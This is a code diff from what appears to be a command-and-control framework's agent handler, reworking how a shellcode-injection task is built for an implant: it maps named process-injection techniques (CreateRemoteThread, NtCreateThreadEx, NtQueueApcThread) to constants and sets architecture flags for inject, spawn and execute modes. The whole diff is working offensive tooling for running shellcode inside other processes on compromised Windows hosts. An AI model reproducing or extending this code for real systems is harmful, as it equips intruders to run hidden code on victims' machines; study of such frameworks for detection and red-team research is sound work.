@@ -758,15 +758,14 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 	case COMMAND_INJECT_SHELLCODE:
 
 		var (
-			TargetArch int
-			x64        int
-			Argument   []byte
+			x64       int
+			Technique int
+			Argument  []byte
 		)
 
 		if val, ok := Optional["Way"]; ok {
 
 			if val.(string) == "Inject" {
-				Inject := 1
 				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 				if err != nil {
 					return job, err
@@ -788,9 +787,25 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					return job, err
 				}
 
-				Technique, err := strconv.Atoi(Optional["Technique"].(string))
-				if err != nil {
-					return job, err
+				switch strings.ToLower(Optional["Technique"].(string)) {
+				case "default":
+					Technique = THREAD_METHOD_DEFAULT
+					break
+
+				case "createremotethread":
+					Technique = THREAD_METHOD_CREATEREMOTETHREAD
+					break
+
+				case "ntcreatethreadex":
+					Technique = THREAD_METHOD_NTCREATEHREADEX
+					break
+
+				case "ntqueueapcthread":
+					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+					break
+
+				default:
+					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
 				}
 
 				x64 = win32.FALSE
@@ -799,7 +814,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 				}
 
 				job.Data = []interface{}{
-					Inject,
+					INJECT_WAY_INJECT,
 					Technique,
 					x64,
 					Binary,
@@ -807,7 +822,6 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					TargetPid,
 				}
 			} else if val.(string) == "Spawn" {
-				Inject := 0
 				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 				if err != nil {
 					return job, err
@@ -824,26 +838,40 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					}
 				}
 
-				Technique, err := strconv.Atoi(Optional["Technique"].(string))
-				if err != nil {
-					return job, err
+				switch strings.ToLower(Optional["Technique"].(string)) {
+				case "default":
+					Technique = THREAD_METHOD_DEFAULT
+					break
+
+				case "createremotethread":
+					Technique = THREAD_METHOD_CREATEREMOTETHREAD
+					break
+
+				case "ntcreatethreadex":
+					Technique = THREAD_METHOD_NTCREATEHREADEX
+					break
+
+				case "ntqueueapcthread":
+					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+					break
+
+				default:
+					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
 				}
 
+				x64 = win32.FALSE
 				if Optional["Arch"] == "x64" {
-					TargetArch = 2
-				} else {
-					TargetArch = 1
+					x64 = win32.TRUE
 				}
 
 				job.Data = []interface{}{
-					Inject,
+					INJECT_WAY_SPAWN,
 					Technique,
-					TargetArch,
+					x64,
 					Binary,
 					Argument,
 				}
 			} else if val.(string) == "Execute" {
-				Inject := 2
 				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 				if err != nil {
 					return job, err
@@ -860,21 +888,36 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					}
 				}
 
-				Technique, err := strconv.Atoi(Optional["Technique"].(string))
-				if err != nil {
-					return job, err
+				switch strings.ToLower(Optional["Technique"].(string)) {
+				case "default":
+					Technique = THREAD_METHOD_DEFAULT
+					break
+
+				case "createremotethread":
+					Technique = THREAD_METHOD_CREATEREMOTETHREAD
+					break
+
+				case "ntcreatethreadex":
+					Technique = THREAD_METHOD_NTCREATEHREADEX
+					break
+
+				case "ntqueueapcthread":
+					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+					break
+
+				default:
+					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
 				}
 
+				x64 = win32.FALSE
 				if Optional["Arch"] == "x64" {
-					TargetArch = 2
-				} else {
-					TargetArch = 1
+					x64 = win32.TRUE
 				}
 
 				job.Data = []interface{}{
-					Inject,
+					INJECT_WAY_EXECUTE,
 					Technique,
-					TargetArch,
+					x64,
 					Binary,
 					Argument,
 				}
